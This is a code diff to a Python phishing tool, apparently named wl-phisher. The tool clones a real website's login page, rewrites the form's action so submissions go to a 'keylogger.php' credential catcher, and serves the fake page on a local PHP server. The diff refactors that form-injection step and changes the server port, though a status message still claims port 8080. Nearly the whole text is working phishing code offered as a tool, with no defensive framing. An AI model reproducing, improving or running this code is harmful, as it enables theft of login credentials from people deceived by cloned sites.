@@ -1,4 +1,3 @@
-import requests
 import os
 import sys
 import time
@@ -6,15 +5,13 @@ import random
 import string
 import argparse
 import subprocess as subp
+import requests
+import urllib.request, urllib.error, urllib.parse
 from bs4 import BeautifulSoup
 
-version = "1.2 (Beta)"
+version = "1.3 (Beta)"
 url = ""
 form_action = ""
-form_action_second = ""
-str_line_second = ""
-str_line = ""
-lenght = ""
 
 def echo(x):
     tc = {"d":"0","m":"31","h":"32","c":"36","B":"34","y":"33","p":"35"}
@@ -31,7 +28,7 @@ def update():
     checking = requests.get("https://raw.githubusercontent.com/zexceed12300/wl-phisher/master/.update")
     r = BeautifulSoup(checking.text, "html.parser")
     s = str(r)
-    if "1.2 (Beta)" in s:
+    if "1.3 (Beta)" in s:
         echo("\h[+] No Update, This tool is latest version\d")
         echo("\m[!] Exit!\d")
         sys.exit()
@@ -58,74 +55,56 @@ def update():
             echo("\m[!] Exit!")
             sys.exit()
 
-
 def cloning():
     global url
     index_file = open("./HTTPServer/index.html", "w")
     echo("\c[*] Cloning Login Page ...\d")
     try:
-        response = requests.get(url)
+        response = urllib.request.urlopen(url)
     except requests.exceptions.MissingSchema:
         echo('\m[!] URL "%s" Does not exist, try -h/--help for helper\d' %url)
         sys.exit()
     except requests.exceptions.ConnectionError:
         echo('\m[!] URL "%s" Does not exist, try -h/--help for helper\d' % url)
         sys.exit()
-    element = BeautifulSoup(response.text, "html.parser")
-    content = str(element)
-    index_file.write(content)
+    element = response.read()
+    webContent = element.decode("utf-8")
+    index_file.write(webContent)
     index_file.close()
     echo("\h[+] Cloned! Saved in ./HTTPServer/index.html\d")
     time.sleep(1)
-    echo("\c[*] Injecting Keylogger\d")
+    echo('\c[*] Finding <form action=""> element\d')
     time.sleep(1)
-    ori_content = open("./HTTPServer/index.html", "r+")
-    for line in ori_content:
-        if "<form action=" in line:
-            global str_line
-            str_line = line
-            global lenght
-            lenght = str_line.__len__()
-        def form_action_label():
-            global str_line
-            if str_line.__len__() > 200:
-                line_len_start_second = str_line.find('<form action="')
-                line_len_end_second = str_line.find('method="post"')
-                line_second = str_line[line_len_start_second:line_len_end_second]
-                global str_line_second
-                str_line_second = str(line_second)
-                form_len_start_second = str_line_second.find('"', 13)
-                form_len_end_second = str_line_second.find(' ', 15)
-                global form_action_second
-                form_action_second = str_line_second[form_len_start_second:form_len_end_second]
-            else:
-                form_len_start = str_line.find('"', 13)
-                form_len_end = str_line.find(' ', 15)
-                global form_action
-                form_action = str_line[form_len_start:form_len_end]
-        form_action_label()
-    s = open("./HTTPServer/index.html").read()
-    if form_action.__len__() > str_line_second.__len__():
+    pageContent = open("./HTTPServer/index.html", "r").read()
+    def injector_modules():
+        if 'action="' in pageContent:
+            begin_len = pageContent.find('<form')
+            ending_len = pageContent.find('">', begin_len)
+            form_script = pageContent[begin_len:ending_len]
+            begin_action = form_script.find('action="')
+            ending_action = form_script.find('" ', begin_action)
+            global form_action
+            form_action = form_script[begin_action:ending_action]+'"'
+            s = open("./HTTPServer/index.html").read()
+        echo("\h[+] Element found :\d {}".format(form_action))
+        time.sleep(1)
+        echo("\c[*] Injecting keylogger ...")
         if form_action=="":
-            echo("\m[!] This Page Login Cannot be Injected With Keylogger!, Read README.md to create your own custom login page\d")
+            echo("\m[!] This Page Login Cannot be Injected With Keylogger!\d")
             echo("\m[!] Exit!\d")
             sys.exit()
-        replace = s.replace(form_action, '"keylogger.php"')
-    else:
-        if form_action_second=="":
-            echo("\m[!] This Page Login Cannot be Injected With Keylogger!, Read README.md to create your own custom login page\d")
-            echo("\m[!] Exit!\d")
-            sys.exit()
-        replace = s.replace(form_action_second, '"keylogger.php"')
-    f = open("./HTTPServer/index.html", "w")
-    f.write(replace)
-    f.close()
-    echo("\h[+] Injected!")
-    server()
+        replace = s.replace(form_action, 'action="keylogger.php"')
+        f = open("./HTTPServer/index.html", "w")
+        f.write(replace)
+        f.close()
+        echo("\h[+] Keylogger injected! :\d {}".format(form_action.replace(form_action, 'action="keylogger.php"')))
+        server()
+    injector_modules()
 
 def randomString(stringLength = 10):
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for i in range(stringLength))
+
 pw_name = randomString(6)
 
 def server():
@@ -137,7 +116,6 @@ def server():
     f_password = open("./HTTPServer/keylogger.php", "w")
     f_password.write(pw_replace)
     f_password.close()
-    global url
     url_replace = pw_replace.replace("URL", url)
     f_url = open("./HTTPServer/keylogger.php", "w")
     f_url.write(url_replace)
@@ -145,11 +123,11 @@ def server():
     c = input("\033[1;33;48m[?] Start Fake login Localhost Server Now?[y/n]\033[1;0;0m")
     if "y" in c:
         echo("\h[+] Server Running On Port ==> 127.0.0.1:8080\d")
-        os.system("cd ./HTTPServer && php -S 127.0.0.1:8080")
+        os.system("cd ./HTTPServer && php -S 127.0.0.1:80")
         flogin_return()
 
     else:
-        echo("\m[!] Exit!")
+        flogin_return()
 
 def flogin_return():
     s = open("./HTTPServer/keylogger.php").read()
@@ -231,4 +209,3 @@ def get_parameters():
         parser.print_help()
 
 get_parameters()
-
